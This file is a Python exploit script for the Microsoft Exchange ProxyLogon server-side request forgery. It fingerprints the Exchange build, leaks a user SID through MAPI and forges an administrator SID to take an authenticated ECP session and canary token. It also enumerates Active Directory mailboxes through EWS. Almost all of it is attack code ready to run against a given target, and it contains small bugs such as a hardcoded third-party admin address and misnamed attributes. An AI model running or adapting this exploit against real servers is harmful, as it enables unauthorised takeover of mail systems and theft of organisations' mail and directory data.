from email import header
from inspect import getargs
from weakref import proxy
from wsgiref import headers
from wsgiref.simple_server import server_version
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import argparse
import xml.etree.ElementTree as ET



EXCHANGE_MAP = {
    '15.0.1497.23' : {'long_version': 'Exchange Server 2013 CU23 Jul21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.18' : {'long_version': 'Exchange Server 2013 CU23 May21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.15' : {'long_version': 'Exchange Server 2013 CU23 Apr21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.12' : {'long_version': 'Exchange Server 2013 CU23 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.2' : {'long_version': 'Exchange Server 2013 CU23', 'version_short': 'Exchange2013'},
    '15.0.1473.6' : {'long_version': 'Exchange Server 2013 CU22 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.1473.3' : {'long_version': 'Exchange Server 2013 CU22', 'version_short': 'Exchange2013'},
    '15.0.1395.12' : {'long_version': 'Exchange Server 2013 CU21 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.1395.4' : {'long_version': 'Exchange Server 2013 CU21', 'version_short': 'Exchange2013'},
    '15.0.1367.3' : {'long_version': 'Exchange Server 2013 CU20', 'version_short': 'Exchange2013'},
    '15.0.1365.1' : {'long_version': 'Exchange Server 2013 CU19', 'version_short': 'Exchange2013'},
    '15.0.1347.2' : {'long_version': 'Exchange Server 2013 CU18', 'version_short': 'Exchange2013'},
    '15.0.1320.4' : {'long_version': 'Exchange Server 2013 CU17', 'version_short': 'Exchange2013'},
    '15.0.1293.2' : {'long_version': 'Exchange Server 2013 CU16', 'version_short': 'Exchange2013'},
    '15.0.1263.5' : {'long_version': 'Exchange Server 2013 CU15', 'version_short': 'Exchange2013'},
    '15.0.1236.3' : {'long_version': 'Exchange Server 2013 CU14', 'version_short': 'Exchange2013'},
    '15.0.1210.3' : {'long_version': 'Exchange Server 2013 CU13', 'version_short': 'Exchange2013'},
    '15.0.1178.4' : {'long_version': 'Exchange Server 2013 CU12', 'version_short': 'Exchange2013'},
    '15.0.1156.6' : {'long_version': 'Exchange Server 2013 CU11', 'version_short': 'Exchange2013'},
    '15.0.1130.7' : {'long_version': 'Exchange Server 2013 CU10', 'version_short': 'Exchange2013'},
    '15.0.1104.5' : {'long_version': 'Exchange Server 2013 CU9', 'version_short': 'Exchange2013'},
    '15.0.1076.9' : {'long_version': 'Exchange Server 2013 CU8', 'version_short': 'Exchange2013'},
    '15.0.1044.25' : {'long_version': 'Exchange Server 2013 CU7', 'version_short': 'Exchange2013'},
    '15.0.995.29' : {'long_version': 'Exchange Server 2013 CU6', 'version_short': 'Exchange2013'},
    '15.0.913.22' : {'long_version': 'Exchange Server 2013 CU5', 'version_short': 'Exchange2013'},
    '15.0.847.64' : {'long_version': 'Exchange Server 2013 SP1 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.847.32' : {'long_version': 'Exchange Server 2013 SP1', 'version_short': 'Exchange2013'},
    '15.0.775.38' : {'long_version': 'Exchange Server 2013 CU3', 'version_short': 'Exchange2013'},
    '15.0.712.24' : {'long_version': 'Exchange Server 2013 CU2', 'version_short': 'Exchange2013'},
    '15.0.620.29' : {'long_version': 'Exchange Server 2013 CU1', 'version_short': 'Exchange2013'},
    '15.0.516.32' : {'long_version': 'Exchange Server 2013 RTM', 'version_short': 'Exchange2013'},
    '15.1.2308.14' : {'long_version': 'Exchange Server 2016 CU21 Jul21SU', 'version_short': 'Exchange2016'},
    '15.1.2308.8' : {'long_version': 'Exchange Server 2016 CU21', 'version_short': 'Exchange2016'},
    '15.1.2242.12' : {'long_version': 'Exchange Server 2016 CU20 Jul21SU', 'version_short': 'Exchange2016'},
    '15.1.2242.10' : {'long_version': 'Exchange Server 2016 CU20 May21SU', 'version_short': 'Exchange2016'},
    '15.1.2242.8' : {'long_version': 'Exchange Server 2016 CU20 Apr21SU', 'version_short': 'Exchange2016'},
    '15.1.2242.4' : {'long_version': 'Exchange Server 2016 CU20', 'version_short': 'Exchange2016'},
    '15.1.2176.14' : {'long_version': 'Exchange Server 2016 CU19 May21SU', 'version_short': 'Exchange2016'},
    '15.1.2176.12' : {'long_version': 'Exchange Server 2016 CU19 Apr21SU', 'version_short': 'Exchange2016'},
    '15.1.2176.9' : {'long_version': 'Exchange Server 2016 CU19 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.2176.2' : {'long_version': 'Exchange Server 2016 CU19', 'version_short': 'Exchange2016'},
    '15.1.2106.13' : {'long_version': 'Exchange Server 2016 CU18 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.2106.2' : {'long_version': 'Exchange Server 2016 CU18', 'version_short': 'Exchange2016'},
    '15.1.2044.13' : {'long_version': 'Exchange Server 2016 CU17 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.2044.4' : {'long_version': 'Exchange Server 2016 CU17', 'version_short': 'Exchange2016'},
    '15.1.1979.8' : {'long_version': 'Exchange Server 2016 CU16 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1979.3' : {'long_version': 'Exchange Server 2016 CU16', 'version_short': 'Exchange2016'},
    '15.1.1913.12' : {'long_version': 'Exchange Server 2016 CU15 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1913.5' : {'long_version': 'Exchange Server 2016 CU15', 'version_short': 'Exchange2016'},
    '15.1.1847.12' : {'long_version': 'Exchange Server 2016 CU14 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1847.3' : {'long_version': 'Exchange Server 2016 CU14', 'version_short': 'Exchange2016'},
    '15.1.1779.8' : {'long_version': 'Exchange Server 2016 CU13 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1779.2' : {'long_version': 'Exchange Server 2016 CU13', 'version_short': 'Exchange2016'},
    '15.1.1713.10' : {'long_version': 'Exchange Server 2016 CU12 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1713.5' : {'long_version': 'Exchange Server 2016 CU12', 'version_short': 'Exchange2016'},
    '15.1.1591.18' : {'long_version': 'Exchange Server 2016 CU11 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1591.10' : {'long_version': 'Exchange Server 2016 CU11', 'version_short': 'Exchange2016'},
    '15.1.1531.12' : {'long_version': 'Exchange Server 2016 CU10 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1531.3' : {'long_version': 'Exchange Server 2016 CU10', 'version_short': 'Exchange2016'},
    '15.1.1466.16' : {'long_version': 'Exchange Server 2016 CU9 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1466.3' : {'long_version': 'Exchange Server 2016 CU9', 'version_short': 'Exchange2016'},
    '15.1.1415.10' : {'long_version': 'Exchange Server 2016 CU8 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1415.2' : {'long_version': 'Exchange Server 2016 CU8', 'version_short': 'Exchange2016'},
    '15.1.1261.35' : {'long_version': 'Exchange Server 2016 CU7', 'version_short': 'Exchange2016'},
    '15.1.1034.26' : {'long_version': 'Exchange Server 2016 CU6', 'version_short': 'Exchange2016'},
    '15.1.845.34' : {'long_version': 'Exchange Server 2016 CU5', 'version_short': 'Exchange2016'},
    '15.1.669.32' : {'long_version': 'Exchange Server 2016 CU4', 'version_short': 'Exchange2016'},
    '15.1.544.27' : {'long_version': 'Exchange Server 2016 CU3', 'version_short': 'Exchange2016'},
    '15.1.466.34' : {'long_version': 'Exchange Server 2016 CU2', 'version_short': 'Exchange2016'},
    '15.1.396.30' : {'long_version': 'Exchange Server 2016 CU1', 'version_short': 'Exchange2016'},
    '15.1.225.42' : {'long_version': 'Exchange Server 2016 RTM', 'version_short': 'Exchange2016'},
    '15.1.225.16' : {'long_version': 'Exchange Server 2016 Preview', 'version_short': 'Exchange2016'},
    '15.2.922.13' : {'long_version': 'Exchange Server 2019 CU10 Jul21SU', 'version_short': 'Exchange2019'},
    '15.2.922.7' : {'long_version': 'Exchange Server 2019 CU10', 'version_short': 'Exchange2019'},
    '15.2.858.15' : {'long_version': 'Exchange Server 2019 CU9 Jul21SU', 'version_short': 'Exchange2019'},
    '15.2.858.12' : {'long_version': 'Exchange Server 2019 CU9 May21SU', 'version_short': 'Exchange2019'},
    '15.2.858.10' : {'long_version': 'Exchange Server 2019 CU9 Apr21SU', 'version_short': 'Exchange2019'},
    '15.2.858.5' : {'long_version': 'Exchange Server 2019 CU9', 'version_short': 'Exchange2019'},
    '15.2.792.15' : {'long_version': 'Exchange Server 2019 CU8 May21SU', 'version_short': 'Exchange2019'},
    '15.2.792.13' : {'long_version': 'Exchange Server 2019 CU8 Apr21SU', 'version_short': 'Exchange2019'},
    '15.2.792.10' : {'long_version': 'Exchange Server 2019 CU8 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.792.3' : {'long_version': 'Exchange Server 2019 CU8', 'version_short': 'Exchange2019'},
    '15.2.721.13' : {'long_version': 'Exchange Server 2019 CU7 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.721.2' : {'long_version': 'Exchange Server 2019 CU7', 'version_short': 'Exchange2019'},
    '15.2.659.12' : {'long_version': 'Exchange Server 2019 CU6 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.659.4' : {'long_version': 'Exchange Server 2019 CU6', 'version_short': 'Exchange2019'},
    '15.2.595.8' : {'long_version': 'Exchange Server 2019 CU5 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.595.3' : {'long_version': 'Exchange Server 2019 CU5', 'version_short': 'Exchange2019'},
    '15.2.529.13' : {'long_version': 'Exchange Server 2019 CU4 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.529.5' : {'long_version': 'Exchange Server 2019 CU4', 'version_short': 'Exchange2019'},
    '15.2.464.15' : {'long_version': 'Exchange Server 2019 CU3 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.464.5' : {'long_version': 'Exchange Server 2019 CU3', 'version_short': 'Exchange2019'},
    '15.2.397.11' : {'long_version': 'Exchange Server 2019 CU2 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.397.3' : {'long_version': 'Exchange Server 2019 CU2', 'version_short': 'Exchange2019'},
    '15.2.330.11' : {'long_version': 'Exchange Server 2019 CU1 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.330.5' : {'long_version': 'Exchange Server 2019 CU1', 'version_short': 'Exchange2019'},
    '15.2.221.18' : {'long_version': 'Exchange Server 2019 RTM Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.221.12' : {'long_version': 'Exchange Server 2019 RTM', 'version_short': 'Exchange2019'},
    '15.2.196.0' : {'long_version': 'Exchange Server 2019 Preview', 'version_short': 'Exchange2019'}
}
EXCHANGE_ALT_MAP = {
    '15.0': {'long_version': 'Exchange Server 2013', 'version_short': 'Exchange2013'},
    '15.1': {'long_version': 'Exchange Server 2016', 'version_short': 'Exchange2016'},
    '15.2': {'long_version': 'Exchange Server 2019', 'version_short': 'Exchange2019'}
}


def get_args():
    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-t', help='Exchange URL', required=True)
    parser.add_argument('-u', help='Email address', required=True)
    parser.add_argument('-f', help='Frontend Server', required=False, default=None)
    parser.add_argument('-b', help='Backend Server', required=False, default="localhost")
    return parser.parse_args()

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class ProxyLogon:

    def __init__(self, target_url, email, frontend=False, backend="localhost", verify=False):
        self.email = email
        self.emails = []
        self.username = email.split("@")[0]
        self.domain = email.split("@")[1]
        self.domains = []
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
        self.target_url = target_url if target_url.startswith('https://') else f'https://{target_url}'
        self.ssrf_url = f'{self.target_url}/ecp/{id_generator()}.js'
        self.sid = None
        self.admin_sid = None
        self.legacyDn = None
        self.legacyDns = []
        self.session_id = None
        self.canary = None
        self.target_be = backend
        self.target_fe = frontend
        self.server_version = None
        self.version = '1942062522'
        self.name_version = 'Exchange2016'
        self.mapi_body_patch = "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        self.rbac_roles = None
        
        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'User-Agent': self.user_agent,
            'Accept-Language': 'en-US,q=0.5,en',
            'Accept' : '*/*',
        }

    def post(self, endpoint, data, headers={}, verify=False):
        #headers['Cookie'] = f'X-BEResource={self.username}@{self.target_be}:444{endpoint}&a=~{self.version}; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.canary};'
        self.session.cookies.set('X-BEResource', f'{self.username}@{self.target_be}:444{endpoint}&a=~{self.version}', path='/')
        headers['User-Agent'] = self.user_agent
        r = self.session.post(
            url=self.ssrf_url,
            data=data,
            headers=headers,
            verify=verify
        )
        return r

    def get(self, endpoint, headers={}):
        self.session.cookies.set('X-BEResource', f'{self.username}@{self.target_be}:444{endpoint}&a=~{self.version}', path='/')
        # = f'X-BEResource={self.username}@{self.target_be}:444{endpoint}&a=~{self.version}; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.canary};'
        r = self.session.get(
            url=self.ssrf_url,
            headers=headers,
        )
        return r

    def set_be_server(self, be_server):
        self.target_be = be_server
        print("[ i ] Got new Backend Server: " + be_server)
        

    def autoDiscoveryBody(self, email):

        autodiscover = ET.Element(
            'Autodiscover', 
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )
        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = email
        ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(autodiscover, encoding='unicode', method='xml')

    def enumerate(self):
        
        # Step 1 - get frontend server
        print("[ i ] Enumerating Target")
        r = self.session.get(self.ssrf_url, headers = {
            'Cookie': f'X-BEResource={self.target_be}~{self.version}'
        }, verify=False)

        if "X-CalculatedBETarget" in r.headers and "X-FEServer" in r.headers:
            self.target_fe = r.headers['X-FEServer']

        # step 2 - get autodiscover info
        print("[ i ] Executing Autodiscover")
        headers = {
            "Cookie": f'X-BEResource={self.target_fe}/autodiscover/autodiscover.xml?a=~{self.version};',
            "Content-Type": "text/xml",
            "X-Requesttype": "Connect",
            "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
            "X-Clientapplication": "Outlook/15.0.4815.1002",
            "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
            "User-Agent": f'{self.user_agent}'
        }
        r = self.session.post(self.ssrf_url, headers=headers, data=self.autoDiscoveryBody(self.email), verify=False)
        if r.status_code != 200:
            print("[ ! ] Autodiscovery Error")
            exit(1)
        # print(r.headers['X-BEServer'])
        self.set_be_server(r.headers['X-BEServer'])
        resp = r.content.decode("utf-8")
        if "<LegacyDN>" not in resp:
            print("[ ! ] Can not get LegacyDN!")
            exit(1)
        
        self.legacyDn = resp.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
        print("[ i ] Got LegacyDN " + self.legacyDn)
        

        # step 3 - get administrator sid
        headers = {
            "Cookie": f'X-BEResource={self.username}@{self.target_be}:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@{self.domain}&a~{self.version}',
            "Content-Type": "application/mapi-http",
            "User-Agent": f'{self.user_agent}',
            "X-Requesttype": "Connect",
            "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
            "X-Clientapplication": "Outlook/15.0.4815.1002",
            "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
        }
        mapi_body = self.legacyDn + self.mapi_body_patch
        r = self.session.post(self.ssrf_url, headers=headers, data=mapi_body, verify=False)
        
        self.server_version = r.headers['X-ServerApplication'].split('Exchange/')[1]
        print("[ i ] Got server version: " + self.server_version)
        if r.status_code != 200 or "act as owner of a UserMailbox".encode() not in r.content:
            print("[ X ] MAPI ERROR!")
            print(r.content)
            exit(1)
        
        resp = r.content.decode("latin-1")
        self.sid = resp.split("with SID ")[1].split(" and MasterAccountSid")[0]
        print("[ i ] Got SID: " + self.sid)
        admin_sid = self.sid.split("-")
        self.admin_sid = '-'.join(admin_sid)
        print("[ i ] Admin SID: " + self.admin_sid)

    def proxyLogon(self):
        body = f"""<r at="Negotiate" ln="admin"><s>{self.admin_sid}</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>"""
        headers = {
            "Cookie": f'X-BEResource={self.username}@{self.target_be}:444/ecp/proxyLogon.ecp?a=~{self.version};',
            "X-Requesttype": "Execute",
            "msExchLogonAccount": self.admin_sid,
            "msExchLogonMailbox": self.admin_sid,
            "msExchProxyUri":"http://127.0.0.1:8080/",
            "msExchTargetMailbox":self.admin_sid,
        }
        r = self.session.post(self.ssrf_url, headers=headers,data=body)
        if r.status_code != 241 or not "set-cookie" in r.headers:
            print("[ ! ] ProxyLogon Error!")
            exit(1)
        
        self.session_id = r.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
        self.canary = r.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
        print("[ i ] Got Session ID: " + self.session_id)
        print("[ i ] Got Canary Token: " + self.canary)
        print("[ i ] Trying to get RBAC Roles...")
        r = self.get(endpoint=f'/ecp/about.aspx?msExchEcpCanary={self.canary}', headers={
            "msExchLogonAccount": self.admin_sid,
            "msExchLogonMailbox": self.admin_sid,
            "msExchProxyUri":"http://127.0.0.1:8080/",
            "msExchTargetMailbox":self.admin_sid,
        })
        if r.status_code != 200:
            print("[ ! ] WRONG CANARY!")
            exit(1)
        resp = r.content.decode("utf-8")
        self.rbac_roles = resp.split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[0]
        print("[ i ] Got RBAC Roles: " + self.rbac_roles)
        print("============================ AUTHENTICATION COMPLETE ============================")

    def get_emails(self):
        get_folder =  '''
            <?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                    <soap:Body>
                        <m:GetFolder>
                        <m:FolderShape>
                            <t:BaseShape>Default</t:BaseShape>
                        </m:FolderShape>
                        <m:FolderIds>
                            <t:DistinguishedFolderId Id="inbox">
                            <t:Mailbox>
                                <t:EmailAddress>administrator@promagroup.com</t:EmailAddress>
                            </t:Mailbox>
                            </t:DistinguishedFolderId>
                        </m:FolderIds>
                        </m:GetFolder>
                    </soap:Body>
                </soap:Envelope>
        '''.format(self.server_version)

        resolve_names = '''
        <?xml version="1.0" encoding="utf-8"?>
            <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                        xmlns:t="https://schemas.microsoft.com/exchange/services/2006/types">
            <soap:Body>
                <ResolveNames xmlns="https://schemas.microsoft.com/exchange/services/2006/messages"
                            xmlns:t="https://schemas.microsoft.com/exchange/services/2006/types"
                            ReturnFullContactData="true">
                <UnresolvedEntry>{}</UnresolvedEntry>
                </ResolveNames>
            </soap:Body>
            </soap:Envelope>
        '''

        headers = {
            'Content-Type': 'text/xml'
        }
        
        r = self.post('/EWS/exchange.asmx?z=a', data=resolve_names.format(self.email), headers=headers)
        try:
            email_xml = ET.fromstring(r.content)

            # Parse UserMailbox LegacyDNs
            mailboxes = email_xml.findall('{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Contact/{*}EmailAddresses/{*}Entry')
            for mailbox in mailboxes:
                if 'X500:' in mailbox.text or 'x500:' in mailbox.text:
                    legacydn = mailbox.text.split('500:')[1]
                    self.legacydns.append(legacydn)
            print(f'[+] Enumerated {len(self.legacydns)} possible UserMailbox LegacyDNs from Active Directory')

            # Parse User LegacyDNs
            emails = email_xml.findall('{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}EmailAddress')
            smtp_domains = {}
            for email in emails:
                self.emails.append(email.text)
                smtp_domain = email.text.split('@')[1]
                if isinstance(smtp_domains.get(smtp_domain), int):
                    smtp_domains[smtp_domain.lower()] += 1
                else:
                    smtp_domains[smtp_domain.lower()] = 0
            print(f'[+] Enumerated {len(self.emails)} possible User LegacyDNs from Active Directory')
            self.domains.update(list(smtp_domains))
            print(f'[+] Enumerated SMTP domains: {self.domains}')
        
        except:
            print(f'[-] Failed enumerating Active Directory emails')
            pass

            



def exploit(proxy_logon):
    proxy_logon.enumerate()
    proxy_logon.proxyLogon()
    

def main():

    args = get_args()
    target_url = args.t
    email = args.u
    target_fe = args.f
    target_be = args.b

    proxy_logon = ProxyLogon(target_url=target_url, email=email, frontend=target_fe, backend=target_be, verify=False)
    exploit(proxy_logon)


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
        print("This script requires Python 3.8 or higher!")
        print("You are using Python {}.{}.".format(sys.version_info.major, sys.version_info.minor))
        sys.exit(1)
    
    main()